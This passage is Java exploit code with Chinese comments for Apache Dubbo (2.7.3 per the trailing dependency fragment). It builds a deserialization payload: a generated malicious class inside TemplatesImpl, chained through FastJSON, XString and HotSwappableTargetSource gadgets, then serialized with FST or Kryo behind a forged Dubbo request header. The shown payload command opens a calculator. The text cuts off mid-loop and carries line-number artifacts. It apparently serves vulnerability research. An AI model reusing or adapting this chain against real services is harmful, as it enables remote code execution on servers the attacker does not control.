 public static void main(String[] args) throws Exception {
69
 // 创建恶意类，用于报错抛出调用链
70
 ClassPool pool = new ClassPool(true);
71
 CtClass evilClass = pool.makeClass("EvilClass");
72
 evilClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.r
untime.AbstractTranslet"));
73
74
 // 让dubbo provider端报错显示调用链，或者弹计算器
75
 //evilClass.makeClassInitializer().setBody("new java.io.IOException().print
StackTrace();");
76
77
 evilClass.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().ex
ec(\"calc\");");
78
79
 byte[] evilClassBytes = evilClass.toBytecode();
80
81
 // 构建templates关键属性，特别是_bytecodes
82
 TemplatesImpl templates = new TemplatesImpl();
83
 setFieldValue(templates, "_bytecodes", new byte[][]{evilClassBytes});
84
 setFieldValue(templates, "_name", "test");
85
 setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
86
87
 // Dubbo自带fastJson解析器，且这种情况下会自动调用对象的getter方法，从而触发Temp
latesImpl.getOutputProperties()
88
 JSONObject jo = new JSONObject();
89
 jo.put("oops",(Serializable)templates); // Vulnerable FastJSON wrapper
90
91
 // 借助Xstring.equals调用到JSON.toString方法
92
 XString x = new XString("HEYO");
93
 Object v1 = new HotSwappableTargetSource(jo);
94
 Object v2 = new HotSwappableTargetSource(x);
95
96
 // 取消下面三行注释，增加new hashMap的注释，并将后方objectOutput.writeObject(ha
shMap)修改为hashSet，从而替换调用链
97
 // HashSet hashSet = new HashSet();
98
 // Field m = getField(HashSet.class, "map");
99
 // HashMap hashMap = (HashMap) m.get(hashSet);
100
101
 HashMap hashMap = new HashMap<>();
102
103
 // 反射修改hashMap中的属性，让其保存v1 和 v2，避免本地调用hashMap.put触发payloa
d
104
 setFieldValue(hashMap, "size", 2);
105
 Class nodeC;
106
107
 try {
108
 nodeC = Class.forName("java.util.HashMap$Node");
109
 }
110
 catch ( ClassNotFoundException e ) {
111
 nodeC = Class.forName("java.util.HashMap$Entry");
112
 }
113
 Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.cl
ass, Object.class, nodeC);
114
 nodeCons.setAccessible(true);
115
116
 Object tbl = Array.newInstance(nodeC, 2);
117
 Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
118
 Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
119
 setFieldValue(hashMap, "table", tbl);
120
121
 // 开始准备字节流
122
 ByteArrayOutputStream bos = new ByteArrayOutputStream();
123
124
 // 选择FST或者Kryo协议进行序列化
125
 Serialization s;
126
 ObjectOutput objectOutput;
127
 switch(EXPLOIT_VARIANT) {
128
 case "FST":
129
 s = new FstSerialization();
130
 objectOutput = new FstObjectOutput(bos);
131
 break;
132
 case "Kryo":
133
 default:
134
 s = new KryoSerialization();
135
 objectOutput = new KryoObjectOutput(bos);
136
 break;
137
 }
138
139
 // 0xc2 is Hessian2 + two‐way + Request serialization
140
 // Kryo | two‐way | Request is 0xc8 on third byte
141
 // FST | two‐way | Request is 0xc9 on third byte
142
143
 // 组装数据包的头部
144
 byte requestFlags = (byte) (FLAG_REQUEST | s.getContentTypeId() | FLAG_TWOW
AY);
145
 byte[] header = new byte[]{MAGIC_HIGH, MAGIC_LOW, requestFlags,
146
 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; // Padding and 0 length LSBs
147
 bos.write(header);
148
149
 // 组装数据包的内容
150
 RpcInvocation ri = new RpcInvocation();
151
 ri.setParameterTypes(new Class[] {Object.class, Method.class,
Object.class});
152
 //ri.setParameterTypesDesc("Ljava/lang/String;[Ljava/lang/String;[Ljava/lan
g/Object;");
153
154
 // 需要根据dubbo存在的服务添加
155
 ri.setArguments(new Object[] { "sayHello", new String[] {"org.apache.dubbo.
demo.DemoService"}, new Object[] {"YOU"}});
156
157
 // Strings need only satisfy "readUTF" calls until "readObject" is reached
158
 // 下面四个随便输入，无所谓
159
 objectOutput.writeUTF("2.0.1");
160
 objectOutput.writeUTF("org.apache.dubbo.demo.DeService");
161
 objectOutput.writeUTF("0.1.0");
162
 objectOutput.writeUTF("sayello");
163
164
 // 不能随便输入
165
 objectOutput.writeUTF("Ljava/lang/String;"); //*/
166
 // 序列化恶意对象
167
 objectOutput.writeObject(hashMap);
168
 objectOutput.writeObject(ri.getAttachments());
169
 objectOutput.flushBuffer();
170
 byte[] payload = bos.toByteArray();
171
 int len = payload.length ‐ header.length;
172
 Bytes.int2bytes(len, payload, 12);
173
 // 将数据包用十六进制输出
174
 for (int i = 0; i 
2
 org.apache.dubbo
3
 dubbo‐common
4
 2.7.3
5